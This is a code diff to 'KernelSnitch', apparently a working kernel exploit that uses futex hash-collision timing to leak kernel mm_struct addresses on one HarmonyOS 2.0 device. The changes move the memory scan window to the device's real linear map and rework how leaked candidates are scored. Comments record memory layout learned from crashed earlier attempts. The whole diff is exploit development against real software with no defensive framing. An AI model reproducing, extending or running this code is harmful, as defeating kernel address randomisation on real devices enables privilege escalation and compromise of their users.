@@ -36,10 +36,10 @@
 #define VA_BITS 39
 #if VA_BITS==39
 #ifndef KERNELSNITCH_IDENTITY_START
-#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
+#define KERNELSNITCH_IDENTITY_START LINEAR_SCAN_START
 #endif
 #ifndef KERNELSNITCH_IDENTITY_END
-#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + (64ULL<<30))
+#define KERNELSNITCH_IDENTITY_END LINEAR_SCAN_END
 #endif
 #define IDENTITY_START KERNELSNITCH_IDENTITY_START
 #define IDENTITY_END   KERNELSNITCH_IDENTITY_END
@@ -204,10 +204,17 @@ struct mm_leak_arg {
     struct kernelsnitch_shared_state *ks;
     struct range range;
 };
-/* CDY v5: panic-proven mapped linear span on this device:
-   mapped: 1.4GB/3GB/5.06GB; UNMAPPED (L1 translation fault): 7.93GB. */
-#define LINEAR_SAFE_START 0xffffff8040000000ULL
-#define LINEAR_SAFE_END   0xffffff8180000000ULL
+/* CDY v6: the REAL linear map. This kernel's memory.h (fetched from the
+   CDY_HarmonyOS2.0 source) defines PAGE_OFFSET = -(1<<(VA_BITS-1)) =
+   0xffffffc000000000 for VA39. The old window 0xffffff8000000000+8GB was
+   modules/vmalloc (kernel image lives at 0xffffff80c8-0xffffff9f), which is
+   why every candidate was an unmapped fluke. Empirical: user pgd at
+   0xfffffff9f3.. (linear offset 231GB), kernel stacks at offsets 42-245GB
+   => the RAM ranks are scattered across ~250GB of linear space. */
+#define LINEAR_SAFE_START 0xffffffc000000000ULL
+#define LINEAR_SAFE_END   0xffffffd000000000ULL   /* +256GB cap */
+#define LINEAR_SCAN_START LINEAR_SAFE_START
+#define LINEAR_SCAN_END   LINEAR_SAFE_END
 
 static void *__mm_leak(void *arg)
 {
@@ -228,21 +235,29 @@ static void *__mm_leak(void *arg)
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 
                 if (!ks->mte_enabled) {
-                    // CDY 4.14: score the candidate against ALL collision
-                    // addresses; the true mm matches the most (some later
-                    // observations go stale on this device). Keep the
-                    // top-scoring candidates.
+                    /* CDY v6: full scan (no early exit), multiplicity
+                       scoring, threshold 4. P(fluke >= 4) ~ 8e-11 per
+                       candidate; over ~285M candidates in the 256GB linear
+                       window that is ~0.02 expected false positives. */
+                    size_t hs[24];
+                    size_t cn = ks->collisions;
+                    if (cn > 24) cn = 24;
+                    for (size_t i = 0; i < cn; ++i)
+                        hs[i] = futex_hash(ks->futex_addrs[i], mm_struct_candidate);
                     size_t score = 0;
-                    for (size_t i = 1; i < ks->collisions; ++i)
-                        score += (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
+                    for (size_t i = 0; i < cn; ++i) {
+                        size_t mult = 0;
+                        for (size_t j = 0; j < cn; ++j)
+                            mult += (hs[i] == hs[j]);
+                        if (mult > score) score = mult;
+                    }
                     if (score > ks->best_score) {
                         ks->best_score = score;
                         ks->mm_cand_cnt = 0;
                     }
-                    if (score == ks->best_score && score > 0 && ks->mm_cand_cnt < 8) {
+                    if (score >= 4 && score == ks->best_score && ks->mm_cand_cnt < 8) {
                         ks->mm_cands[ks->mm_cand_cnt++] = mm_struct_candidate;
                         ks->mm_struct = mm_struct_candidate;
-                        ks->found = 1;
                     }
                 } else {
                     // need to set the tag if mte is enabled
